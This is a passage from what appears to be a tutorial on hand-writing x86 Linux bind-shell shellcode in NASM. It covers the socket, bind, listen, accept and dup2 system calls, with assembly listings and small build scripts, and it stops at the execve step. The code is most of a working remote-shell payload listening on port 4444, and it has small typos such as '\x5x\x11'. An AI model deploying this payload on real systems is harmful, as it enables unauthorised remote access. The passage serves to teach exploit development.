        <span style="color:#a6e22e">xor</span> eax, eax    <span style="color:#75715e">; clear the value of eax </span>
        <span style="color:#a6e22e">xor</span> ebx, ebx    <span style="color:#75715e">; clear the value of ebx </span>
</code></pre></div><p>Write the values of the <code>sys_socketcall</code> and <code>sys_socket</code> into the registers.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>            <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">1</span>              <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
</code></pre></div><p>To build the parameters, there are two things we need to keep in mind. Firstly, we need to pass them onto the stack in <code>reverse</code> order. This is so when the system reads the location it is reading in the correct order.</p>
<p>Secondly, we cannot push or mov a value of 0 as that will automatically create a null byte (\x00) which will kill our shellcode. Instead we&rsquo;ll create a null in ecx by xoring it with itself and then pushing that value to the stack.</p>
<p>Lets push these parameters onto the stack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> ecx, ecx     <span style="color:#75715e">; clear the value of ecx</span>
<span style="color:#a6e22e">push</span> ecx         <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>           <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>           <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
</code></pre></div><p>Now that our arguments are on the stack, we need to mov the location of them into ecx. Since esp always points to the top of the stack, we can just move esp into ecx and then ecx will point to our argument location on the stack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> ecx, esp        <span style="color:#75715e">; push the location of our arguments into ecx</span>
</code></pre></div><p>Now we are ready to call the <code>sys_socket</code> function. We call a function using a int 0x80 (\x80).</p>
<p>Before we do that, we need to remember that in the man page for socket, the socket file descriptor will be returned to us. We are going to need this descriptor in other calls so we need to save it somewhere. We can put the value into edx for now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
<span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>
</code></pre></div><p>That&rsquo;s it for the socket call, on to the bind call.</p>
<h1 id="step-2-bind">Step 2: Bind</h1>
<p>Now that we&rsquo;ve called the <code>sys_socket</code> and received the socket file descriptor, lets start building our <code>sys_bind</code>.</p>
<p>The <a href="http://man7.org/linux/man-pages/man2/bind.2.html">man</a> page for bind shows us:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">When a socket is created with socket(2), it exists in a name space
(address family) but has no address assigned to it.  bind() assigns
the address specified by addr to the socket referred to by the file
descriptor sockfd.  addrlen specifies the size, in bytes, of the
address structure pointed to by addr.  Traditionally, this operation
is called “assigning a name to a socket”.
</code></pre></div><p>The usage for bind is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</code></pre></div><p>We already know that this is part of <code>sys_socketcall</code> so the value for <code>eax</code> will be <code>102</code>.</p>
<p>We also know from earlier that sys_bind has the value <code>2</code> which we will use in <code>ebx</code>.</p>
<p>Lets look at the 3 arguments it requires though:</p>
<table>
<thead>
<tr>
<th>Argument</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>sockfd</td>
<td>Integer</td>
<td>The socket file descriptor which we got from our first socket call</td>
</tr>
<tr>
<td>sockaddr</td>
<td>Integer</td>
<td>The socket address consisting of protocol, port, ip address</td>
</tr>
<tr>
<td>addrleng</td>
<td>Integer</td>
<td>The IP address length</td>
</tr>
</tbody>
</table>
<p><!-- raw HTML omitted --></p>
<h2 id="int-sockfd">int sockfd</h2>
<p>We already have the socket file descriptor saved in edx so we know this value.</p>
<h2 id="int-sockaddr">int sockaddr</h2>
<p>The actual structure passed for the <code>addr</code> argument will depend on the address family.</p>
<p>The <code>sockaddr</code> structure is defined as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">struct sockaddr {
  sa_family_t   sa_family;
  char          sa_data[14];
}
</code></pre></div><p>The purpose of this structure is to cast the structure pointer passed in <code>addr</code> in order to avoid compiler warnings.</p>
<p>When we convert this to plain &ldquo;english&rdquo;, we need to pass it 3 things:</p>
<ul>
<li><code>protocol</code></li>
<li><code>port</code></li>
<li><code>ip address</code></li>
</ul>
<p>These 3 arguments need to be placed together on the stack and then the location of these needs to be passed to <code>the sys_bind</code> call.</p>
<h3 id="protocol">protocol</h3>
<p>The protocol we are using is <code>AF_INET</code> which if you recall is IPv4 and has a value of <code>2</code>.</p>
<h3 id="port">port</h3>
<p>We need to choose a port number to bind to our socket and pass this value in hex to the second argument. Finding integer in hex is something we&rsquo;ll need to do frequently so lets create a script to do it for us.</p>
<p>Create a file called <code>int2hex.py</code> and paste the following code into it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
<span style="color:#f92672">import</span> sys

<span style="color:#66d9ef">print</span> hex(int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]))
</code></pre></div><p>Make the file executable <code>chmod +x int2hex.py</code> and then run it, passing the desired port as an argument:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./int2hex.py <span style="color:#ae81ff">4444</span>
</code></pre></div><p>This will take the desired port number and return its hex value:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">0x115c
</code></pre></div><p>If we convert this to little endian, we&rsquo;ll end up with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">\x5c\x11
</code></pre></div><p>which can also be represented as</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">0x5c11
</code></pre></div><h3 id="ip-address">ip address</h3>
<p>The last parameter we need to pass is the IP Address. Since we want to listen on any address we&rsquo;ll use the <code>INADDR_ANY</code> argument which has a value of <code>0</code>.</p>
<p>Combining these produces our final value for <code>sockaddr</code> as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">(2, \x5x\x11, 0)
</code></pre></div><h2 id="addrlen">addrlen</h2>
<p>The last argument needed for our <code>sys_bind</code> call is the address length. Since we&rsquo;re using IPv4, this will be <code>16</code>.</p>
<p>In summary, our <code>sys_socket</code> call now looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_sockcall[102 =&gt; eax].sys_bind[2 =&gt; ebx](edx, (2, \x5x\x11, 0), 16)[ =&gt; ecx]
</code></pre></div><p>Lets add these new values to our assembly code.</p>
<p>Start by clearing out eax.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax    <span style="color:#75715e">; clear the value of eax</span>
</code></pre></div><p>Next lets push our 3 arguments that make up sockaddr onto the stack in reverse order.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack since it&#39;s null (INADDR_ANY = 0)</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
</code></pre></div><p>Now that we have these 3 values sitting on the stack, lets store their location in ecx using esp</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move value of esp into ecx, the location of our sockaddr arguments</span>
</code></pre></div><p>Lets start the final set of the <code>bind</code> arguments. First, we need to push the <code>addrlen</code> argument</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
</code></pre></div><p>Now push the location of our <code>sockaddr</code> argument to the stack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
</code></pre></div><p>Finally push the <code>sockfd</code> stored in <code>edx</code> to the stack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
</code></pre></div><p>We now have all the arguments stored on the stack, so we need to populate the <code>eax</code>, <code>ebx</code> and <code>ecx</code> values.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">2</span>         <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
</code></pre></div><p>That should do it, lets call the <code>sys_bind</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>
</code></pre></div><p>That&rsquo;s it, the bind has been called and port 4444 is now bound to our socket.</p>
<p>The next step is to start listening on that port.</p>
<p><!-- raw HTML omitted --></p>
<h1 id="step-3-listen">Step 3: Listen</h1>
<blockquote>
<p>From this point on, you should know how to look up calls in the <a href="https://www.man7.org/linux/man-pages/">man</a> pages so we won&rsquo;t be going into as much information as before.</p>
</blockquote>
<p>Let&rsquo;s take a look at the <code>listen()</code> system call:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">listen() marks the socket referred to by sockfd as a passive socket,
that is, as a socket that will be used to accept incoming connection
requests using accept(2)

Usage:
  int listen(int sockfd, int backlog);
</code></pre></div><p>The <code>sys_listen</code> call, value <code>4</code>, takes two arguments:</p>
<table>
<thead>
<tr>
<th>Argument</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>sockfd</td>
<td>Integer</td>
<td>The socket file descriptor</td>
</tr>
<tr>
<td>backlog</td>
<td>Integer</td>
<td>The maximum length to which the queue of pending connections for sockfd may grow</td>
</tr>
</tbody>
</table>
<p>We know that the <code>sockfd</code> is currently stored in <code>edx</code>.</p>
<p>We don&rsquo;t want to set a maximum queue length so we&rsquo;ll make this value <code>0</code></p>
<p>Our call then should look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_sockcall[102 =&gt; eax].sys_listen[4 = ebx](sockfd[edx], backlog[0])[ =&gt; ecx];
</code></pre></div><p>Let&rsquo;s create the assembly instructions.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax </span>
<span style="color:#a6e22e">push</span> eax             <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
<span style="color:#a6e22e">push</span> edx             <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
<span style="color:#a6e22e">mov</span> ecx, esp         <span style="color:#75715e">; store the location of our arguments into ecx</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>         <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
<span style="color:#a6e22e">xor</span> ebx, ebx         <span style="color:#75715e">; clear value of ebx to 0</span>
<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">4</span>           <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_listen</span>
</code></pre></div><p>Great, now we should have a listener on port 4444 which is connected to our socket. One last step before we test if it is actually accepting connections.</p>
<p><!-- raw HTML omitted --></p>
<h1 id="step-4-accept">Step 4: Accept</h1>
<p>Let&rsquo;s take a look at the <code>accept()</code> system call:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The accept() system call is used with connection-based socket types
(SOCK_STREAM, SOCK_SEQPACKET).  It extracts the first connection
request on the queue of pending connections for the listening socket,
sockfd, creates a new connected socket, and returns a new file
descriptor referring to that socket.

Usage:
  int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);`
</code></pre></div><p>The accept call takes 3 parameters:</p>
<table>
<thead>
<tr>
<th>Argument</th>
<th>Type</th>
<th>Description</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>sockfd</td>
<td>Integer</td>
<td>Our <code>socket</code> file descriptor still stored in <code>edx</code></td>
<td></td>
</tr>
<tr>
<td>addr</td>
<td>Struct</td>
<td>The IP address we want to accept connections from</td>
<td></td>
</tr>
<tr>
<td>addrlen</td>
<td>Size_t</td>
<td>The IP address length we want to accept connections from</td>
<td></td>
</tr>
</tbody>
</table>
<p>These should be familiar as we&rsquo;ve used some previously in other calls.</p>
<p>Seeing as we want to accept connections from anywhere, we&rsquo;ll leave these as <code>0</code>.</p>
<p>So our call should look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall[102 =&gt; eax].sys_accept[5 =&gt; ebx](sockfd[edx], addr[0], addrlen[0])[ =&gt; ecx];
</code></pre></div><p>Build this into assembly instructions</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax</span>
<span style="color:#a6e22e">push</span> eax             <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
<span style="color:#a6e22e">push</span> eax             <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
<span style="color:#a6e22e">push</span> edx             <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
<span style="color:#a6e22e">mov</span> ecx, esp         <span style="color:#75715e">; move the location of our arguments into ecx</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>         <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
<span style="color:#a6e22e">xor</span> ebx, ebx         <span style="color:#75715e">; clear value of ebx</span>
<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">5</span>           <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_accept</span>
</code></pre></div><p>In the accept <a href="http://man7.org/linux/man-pages/man2/accept.2.html">man</a> page, it says that <code>sys_accept</code> call will return a value to us, we&rsquo;ll need to save this value for the next step.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> edx, eax          <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>
</code></pre></div><p>Lets compile and test our code. At this point our <code>bindshell.nasm</code> file should look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start            

<span style="color:#66d9ef">section</span> .text
_start:

        <span style="color:#75715e">; Start of our shellcode</span>

        <span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax </span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear the value of ebx </span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">1</span>         <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
        <span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear the value of ecx</span>
        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>             <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>             <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; push the location of our arguments into ecx</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>

        <span style="color:#75715e">; sys_bind (bind a port number to our socket)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax</span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack as it&#39;s null (INADDR_ANY = 0)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; mov value of esp into ecx, the location of our sockaddr arguments</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">2</span>         <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>

        <span style="color:#75715e">; sys_listen (listen on our created socket)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax </span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; store the location of our arguments into ecx</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx to 0</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">4</span>         <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_listen</span>

        <span style="color:#75715e">; sys_accept (accept connections on our created port)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the location of our arguments into ecx</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">5</span>         <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_accept</span>
        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>
</code></pre></div><p>We will be compiling <code>.nasm</code> files a lot so lets create a script to save time.</p>
<p>Create a new file called <code>nassemble.sh</code> with the following code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
nasm -f elf32 -o $1.o $1.nasm
ld -z execstack -o $1 $1.o
</code></pre></div><p>Make the file executable and run it while passing it our file name. make sure NOT to include the <code>.nasm</code> extension as it may destroy your file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./nassemble.sh bindshell
</code></pre></div><p><img src="https://i.imgur.com/aUTnXFt.png" alt=""></p>
<p>Lets run our bindshell file and see if it creates a listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./bindshell
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netstat -antp
</code></pre></div><p><img src="https://i.imgur.com/fdIpo36.png" alt=""></p>
<p>Fantastic, we have a bind listening on port 4444 listening on any IP address. So far so good. Lets get this bind to start talking to our shell.</p>
<p><!-- raw HTML omitted --></p>
<h1 id="step-5-dup2">Step 5: Dup2</h1>
<p>You know the drill&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">dup2() makes newfd be the copy of oldfd, closing newfd first if
necessary.

Usage:
  int dup2(int oldfd, int newfd);`
</code></pre></div><p>We are going to need some file descriptors for our socket to send and receive the responses into our execve call. We will use sys_dup2 to perform this task.</p>
<p>sys_dup2 carries the system call value of <code>63</code>.</p>
<p>It takes 2 arguments:</p>
<table>
<thead>
<tr>
<th>Argument</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>oldfd</td>
<td>Integer</td>
<td>The old file descriptor</td>
</tr>
<tr>
<td>newfd</td>
<td>Integer</td>
<td>The new file descriptor</td>
</tr>
</tbody>
</table>
<p><!-- raw HTML omitted --></p>
<p>The old file descriptor will be the value we just returned after executing our <code>sys_accept</code> call which we stored in <code>edx</code>.</p>
<p>The new file descriptor will be the ones we need to create.</p>
<p>To get shell functionality, We will need to create the following 3 descriptors:</p>
<table>
<thead>
<tr>
<th>Descriptor</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>stdin</td>
<td>0</td>
</tr>
<tr>
<td>stdout</td>
<td>1</td>
</tr>
<tr>
<td>stderr</td>
<td>2</td>
</tr>
</tbody>
</table>
<p><!-- raw HTML omitted --></p>
<p>Our call for <code>sys_dup2</code> will look like this</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_dup2[63 =&gt; eax](oldfd[edx =&gt; ebx], newfd =&gt; ecx);
</code></pre></div><p>Build the assembly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
<span style="color:#a6e22e">mov</span> ebx, edx          <span style="color:#75715e">; move the stored oldfd argument to ebx (currently stored in edx)</span>
<span style="color:#a6e22e">xor</span> ecx, ecx          <span style="color:#75715e">; set ecx to 0 for stdin</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
</code></pre></div><p>That should have created our new <code>stdin</code> file descriptor, now to create the <code>stdout</code> and <code>stderr</code> by incrementing <code>ecx</code> and recalling the <code>sys_dup2</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
<span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 1 for stdout</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
<span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
<span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 2 for stderr</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
</code></pre></div><p>Great, onto the last step&hellip;execve!</p>
<h1 id="step-6-execve">Step 6: Execve</h1>
<p>One more time&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">execve() executes the program pointed to by filename.  filename must
be either a binary executable, or a script.

Usage:
  int execve(const char *filename, char *const argv[], char *const envp[]);`
</code></pre></div><p>Execve takes 3 arguments:</p>
<table>
<thead>
<tr>
